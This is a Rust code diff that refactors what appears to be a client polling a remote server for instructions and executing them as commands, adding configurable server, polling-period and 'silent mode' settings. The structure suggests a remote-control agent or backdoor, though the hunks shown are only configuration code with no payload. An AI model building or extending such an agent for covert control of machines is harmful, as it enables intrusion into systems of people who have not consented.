@@ -3,12 +3,13 @@ use std::net::TcpStream;
 use std::process::Command;
 use std::{io, thread, time};
 
-pub fn run(full_address: &str) {
-    let duration = time::Duration::from_secs(2);
+pub fn run(config: Config)  {
     loop {
-        thread::sleep(duration);
-        println!("Connecting to server at {}", full_address);
-        let stream = TcpStream::connect(full_address);
+        thread::sleep(config.request_period.to_duration());
+        let full_address = config.server.full_address();
+
+        println!("Connecting to server at {}", &full_address);
+        let stream = TcpStream::connect(&full_address);
 
         match stream {
             Ok(stream) => {
@@ -143,6 +144,64 @@ fn instruction_factory(instruction: &str) -> Box<dyn Executable> {
             parts[2].to_string(),
         )),
         _ => Box::new(ReceivedCommand::from_string("".to_string())),
+    }
+}
+
+pub enum TimeUnit {
+    Milliseconds,
+    Seconds,
+    Minutes,
+    Hours,
+    Days,
+}
+
+pub struct Period {
+    value: u64,
+    unit: TimeUnit,
+}
+
+impl Period {
+    pub fn new(value: u64, unit: TimeUnit) -> Self {
+        Period { value, unit }
+    }
+    fn to_duration(&self) -> time::Duration {
+        match self.unit {
+            TimeUnit::Milliseconds => time::Duration::from_millis(self.value),
+            TimeUnit::Seconds => time::Duration::from_secs(self.value),
+            TimeUnit::Minutes => time::Duration::from_secs(self.value * 60),
+            TimeUnit::Hours => time::Duration::from_secs(self.value * 60 * 60),
+            TimeUnit::Days => time::Duration::from_secs(self.value * 60 * 60 * 24),
+        }
+    }
+}
+
+pub struct Server {
+    address: String,
+    port: u16,
+}
+impl Server {
+    pub fn new(address: String, port: u16) -> Self {
+        Server { address, port }
+    }
+
+    fn full_address(&self) -> String {
+        format!("{}:{}", self.address, self.port)
+    }
+}
+
+pub struct Config {
+    server: Server,
+    request_period: Period,
+    silent_mode: bool,
+}
+
+impl Config {
+    pub fn new(server : Server, request_period : Period, silent_mode : bool) -> Self {
+        Config {
+            server,
+            request_period,
+            silent_mode,
+        }
     }
 }
 
